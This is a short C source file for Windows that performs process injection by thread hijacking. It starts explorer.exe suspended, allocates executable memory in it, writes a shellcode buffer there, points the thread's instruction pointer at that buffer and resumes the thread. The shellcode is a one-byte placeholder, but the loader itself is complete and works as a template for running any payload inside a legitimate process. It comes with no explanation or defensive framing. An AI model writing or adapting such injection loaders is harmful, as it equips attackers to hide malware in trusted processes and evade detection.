#include <windows.h>
#include <stdio.h>

char exename[] = "C:\\Windows\\explorer.exe";

unsigned char shellcode[] =
"\x90";

int main()
{
    void *exec;
    size_t MalSize = sizeof(shellcode);

    STARTUPINFOA si = {
        sizeof(si)
    };
    PROCESS_INFORMATION pi;

    CreateProcessA(exename, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    exec = VirtualAllocEx(pi.hProcess, NULL, MalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(pi.hProcess, exec, shellcode, MalSize, NULL);
    
    CONTEXT CT;    
    CT.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &CT);

    CT.Rip = (DWORD64)exec;

    SetThreadContext(pi.hThread, &CT);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}

